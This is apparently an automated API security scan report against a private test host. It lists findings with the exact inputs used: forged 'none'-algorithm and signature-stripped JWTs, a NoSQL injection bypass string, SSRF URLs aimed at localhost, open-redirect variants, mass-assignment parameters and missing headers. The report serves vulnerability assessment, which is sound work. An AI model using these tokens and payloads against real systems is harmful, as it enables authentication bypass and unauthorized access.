# ZAP-Python Security Report

**Target:** http://192.168.0.128:8888/
**Scanners:** Active IDOR Scanner, OS Command Injection, Missing Security Headers, Username Hash Disclosure (IDOR), SQL Injection, JWT Security Scanner, Mass Assignment Scanner, External Redirect Scanner, SSRF Scanner, XML External Entity (XXE)
**Total Findings:** 939

## Critical Severity Findings

### JWT None Algorithm
**Category:** API2:2023 Broken Authentication
**Exploitability:** High
**Description:** The server accepted a JWT signed with the 'none' algorithm.

**Affected Endpoints (7):**

#### 1. GET /community/api/v2/community/posts/recent
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 2. POST /identity/api/v2/vehicle/resend_email
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 3. GET /workshop/api/management/users/all
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 4. GET /workshop/api/mechanic/service_requests
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 5. GET /workshop/api/shop/orders/all
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 6. GET /workshop/api/shop/products
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 7. GET /workshop/api/shop/return_qr_code
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

---
### JWT Signature Exclusion
**Category:** API2:2023 Broken Authentication
**Exploitability:** High
**Description:** The server accepted a JWT with the signature removed.

**Affected Endpoints (1):**

#### 1. GET /workshop/api/shop/return_qr_code
```text
Token Used: eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

---
### NoSQL Injection (Logic Bypass)
**Category:** API8:2023 Injection
**Exploitability:** High
**Description:** The endpoint returned HTTP 200 OK for a NoSQL logic bypass payload. This suggests it accepted the query.

**Affected Endpoints (4):**

#### 1. POST /identity/api/auth/forget-password
```text
Param: body
Payload: {'email': "'; return true; var foo='", 'password': 'test'}
Response Code: 200
```

#### 2. POST /identity/api/auth/forget-password
```text
Param: body
Payload: {'coupon_code': 'test', 'amount': "'; return true; var foo='"}
Response Code: 200
```

#### 3. POST /identity/api/auth/forget-password
```text
Param: body
Payload: {'content': 'test', 'title': "'; return true; var foo='"}
Response Code: 200
```

#### 4. POST /workshop/api/shop/products
```text
Param: body
Payload: {'email': 'test', 'password': "'; return true; var foo='"}
Response Code: 200
```

---
### SSRF - Internal Network Access
**Category:** API10:2023 Server Side Request Forgery (SSRF)
**Exploitability:** High
**Description:** The application returned a response indicating successful access to localhost:8888.

**Affected Endpoints (8):**

#### 1. POST /community/api/v2/community/posts
```text
Payload: http://127.0.0.1.nip.io:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 2. POST /identity/api/v2/user/reset-password
```text
Payload: http://localhost:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 3. POST /identity/api/v2/user/reset-password
```text
Payload: http://127.0.0.1.nip.io:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 4. GET /workshop/api/mechanic/service_requests
```text
Payload: http://localhost:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 5. GET /workshop/api/mechanic/service_requests
```text
Payload: http://127.0.0.1.nip.io:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 6. POST /workshop/api/merchant/contact_mechanic
```text
Payload: http://localhost:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 7. POST /workshop/api/merchant/contact_mechanic
```text
Payload: http://127.0.0.1.nip.io:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 8. POST /workshop/api/merchant/contact_mechanic
```text
Payload: http://127.0.0.1.nip.io:8888
Status: 500
Content Matched: response_from_mechanic_api or 200 OK
```

---
## High Severity Findings

### Potential IDOR (ID Fuzzing)
**Category:** API1:2023 Broken Object Level Authorization
**Exploitability:** High
**Description:** The endpoint returned a 2xx success code when accessing ID '1' via ID Fuzzing. Verify authorization.

**Affected Endpoints (1):**

#### 1. GET /workshop/api/shop/orders/{order_id}
```text
Method: GET
URL: http://192.168.0.128:8888/workshop/api/shop/orders/1
Payload: 1
Status: 200
```

---
### Potential IDOR (Method Swap (GET))
**Category:** API1:2023 Broken Object Level Authorization
**Exploitability:** High
**Description:** The endpoint returned a 2xx success code when accessing ID '1' via Method Swap (GET). Verify authorization.

**Affected Endpoints (1):**

#### 1. GET /workshop/api/shop/orders/{order_id}
```text
Method: GET
URL: http://192.168.0.128:8888/workshop/api/shop/orders/1
Payload: 1
Status: 200
```

---
### SSRF - Connection Attempt Failed
**Category:** API10:2023 Server Side Request Forgery (SSRF)
**Exploitability:** High
**Description:** The application revealed a connection error when trying to access an internal port, indicating it attempted the connection.

**Affected Endpoints (1):**

#### 1. POST /workshop/api/merchant/contact_mechanic
```text
Payload: http://127.0.0.1.nip.io:8888
Response content indicates connection failure (Blind SSRF): '{"message":"Could not connect to mechanic api."}'
```

---
## Medium Severity Findings

### Mass Assignment (Status Anomaly)
**Category:** API3:2023 Broken Object Property Level Authorization
**Exploitability:** Medium
**Description:** Injecting 'roles' caused a status code change from 400 to 200. Investigate for logic bypass.

**Affected Endpoints (12):**

#### 1. POST /community/api/v2/community/posts
```text
Param: credit
Baseline Status: 400
Attack Status: 200
```

#### 2. POST /community/api/v2/community/posts
```text
Param: status
Baseline Status: 400
Attack Status: 200
```

#### 3. POST /community/api/v2/community/posts
```text
Param: isVerified
Baseline Status: 400
Attack Status: 200
```

#### 4. POST /community/api/v2/community/posts
```text
Param: admin
Baseline Status: 400
Attack Status: 200
```

#### 5. POST /community/api/v2/community/posts
```text
Param: confirmed
Baseline Status: 400
Attack Status: 200
```

#### 6. POST /community/api/v2/coupon/new-coupon
```text
Param: roles
Baseline Status: 400
Attack Status: 200
```

#### 7. POST /community/api/v2/coupon/new-coupon
```text
Param: type
Baseline Status: 400
Attack Status: 200
```

#### 8. POST /community/api/v2/coupon/new-coupon
```text
Param: balance
Baseline Status: 400
Attack Status: 200
```

#### 9. POST /community/api/v2/coupon/new-coupon
```text
Param: credit
Baseline Status: 400
Attack Status: 200
```

#### 10. POST /community/api/v2/coupon/new-coupon
```text
Param: status
Baseline Status: 400
Attack Status: 200
```

#### 11. POST /community/api/v2/coupon/new-coupon
```text
Param: isVerified
Baseline Status: 400
Attack Status: 200
```

#### 12. POST /community/api/v2/coupon/new-coupon
```text
Param: confirmed
Baseline Status: 400
Attack Status: 200
```

---
### Open Redirect (Header)
**Category:** API7:2023 Security Misconfiguration
**Exploitability:** Medium
**Description:** The application redirects to an arbitrary external domain specified in the request parameter.

**Affected Endpoints (22):**

#### 1. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: http://9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
Location Header: /community/api/v2/community/posts/http:/9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
```

#### 2. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: https://9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
Location Header: /community/api/v2/community/posts/https:/9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
```

#### 3. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: //9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
Location Header: /community/api/v2/community/posts/9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
```

#### 4. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: HtTpS://9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
Location Header: /community/api/v2/community/posts/HtTpS:/9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
```

#### 5. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: HtTp://9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
Location Header: /community/api/v2/community/posts/HtTp:/9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
```

#### 6. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: https://9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org/?foo
Location Header: /community/api/v2/community/posts/https:/9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org/?foo
```

#### 7. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: https://\9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
Location Header: /community/api/v2/community/posts/https:/%5C9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
```

#### 8. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: http://\9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
Location Header: /community/api/v2/community/posts/http:/%5C9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org
```

#### 9. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: 5;URL='https://9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org'
Location Header: /community/api/v2/community/posts/5;URL=%27https:/9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org%27
```

#### 10. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: URL='http://9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org'
Location Header: /community/api/v2/community/posts/URL=%27http:/9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org%27
```

#### 11. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: 5;URL='https://9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org/?foo'
Location Header: /community/api/v2/community/posts/5;URL=%27https:/9db29e00-0e48-47f1-8ca3-3a724559ebab.owasp.org/?foo'
```

#### 12. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: http://d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org
Location Header: /community/api/v2/community/posts/http:/d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org/comment
```

#### 13. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: https://d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org
Location Header: /community/api/v2/community/posts/https:/d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org/comment
```

#### 14. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: //d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org
Location Header: /community/api/v2/community/posts/d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org/comment
```

#### 15. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: HtTpS://d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org
Location Header: /community/api/v2/community/posts/HtTpS:/d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org/comment
```

#### 16. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: HtTp://d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org
Location Header: /community/api/v2/community/posts/HtTp:/d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org/comment
```

#### 17. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: https://d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org/?foo
Location Header: /community/api/v2/community/posts/https:/d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org/?foo/comment
```

#### 18. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: https://\d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org
Location Header: /community/api/v2/community/posts/https:/%5Cd1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org/comment
```

#### 19. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: http://\d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org
Location Header: /community/api/v2/community/posts/http:/%5Cd1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org/comment
```

#### 20. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: 5;URL='https://d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org'
Location Header: /community/api/v2/community/posts/5;URL=%27https:/d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org%27/comment
```

#### 21. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: URL='http://d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org'
Location Header: /community/api/v2/community/posts/URL=%27http:/d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org%27/comment
```

#### 22. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: 5;URL='https://d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org/?foo'
Location Header: /community/api/v2/community/posts/5;URL=%27https:/d1ff03f4-ff67-47e2-be58-fb52fc3d1f71.owasp.org/?foo'/comment
```

---
## Low Severity Findings

### Missing Content-Security-Policy Header
**Category:** API7:2023 Security Misconfiguration
**Exploitability:** Low
**Description:** The response is missing the Content-Security-Policy security header.

**Affected Endpoints (19):**

#### 1. GET /community/api/v2/community/posts/recent
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 2. GET /community/api/v2/community/posts/{postId}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 3. POST /community/api/v2/community/posts/{postId}/comment
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 4. DELETE /identity/api/v2/admin/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 5. DELETE /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 6. GET /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 7. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 8. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 9. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 10. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 11. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Content-Disposition', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 12. GET /identity/api/v2/vehicle/{vehicleId}/location
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 13. GET /workshop/api/management/users/all
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 14. GET /workshop/api/mechanic/receive_report
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 15. GET /workshop/api/mechanic/service_requests
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 16. GET /workshop/api/shop/orders/all
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 17. POST /workshop/api/shop/orders/return_order
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 18. GET /workshop/api/shop/orders/{order_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 19. PUT /workshop/api/shop/orders/{order_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

---
### Missing Strict-Transport-Security Header
**Category:** API7:2023 Security Misconfiguration
**Exploitability:** Low
**Description:** The response is missing the Strict-Transport-Security security header.

**Affected Endpoints (19):**

#### 1. GET /community/api/v2/community/posts/recent
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 2. GET /community/api/v2/community/posts/{postId}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 3. POST /community/api/v2/community/posts/{postId}/comment
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 4. DELETE /identity/api/v2/admin/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 5. DELETE /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 6. GET /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 7. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 8. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 9. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 10. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 11. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Content-Disposition', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 12. GET /identity/api/v2/vehicle/{vehicleId}/location
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 13. GET /workshop/api/management/users/all
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 14. GET /workshop/api/mechanic/receive_report
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 15. GET /workshop/api/mechanic/service_requests
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 16. GET /workshop/api/shop/orders/all
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 17. POST /workshop/api/shop/orders/return_order
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 18. GET /workshop/api/shop/orders/{order_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 19. PUT /workshop/api/shop/orders/{order_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

---
### Missing X-Content-Type-Options Header
**Category:** API7:2023 Security Misconfiguration
**Exploitability:** Low
**Description:** The response is missing the X-Content-Type-Options security header.

**Affected Endpoints (4):**

#### 1. GET /community/api/v2/community/posts/recent
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 2. GET /community/api/v2/community/posts/{postId}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 3. POST /community/api/v2/community/posts/{postId}/comment
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 4. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

---
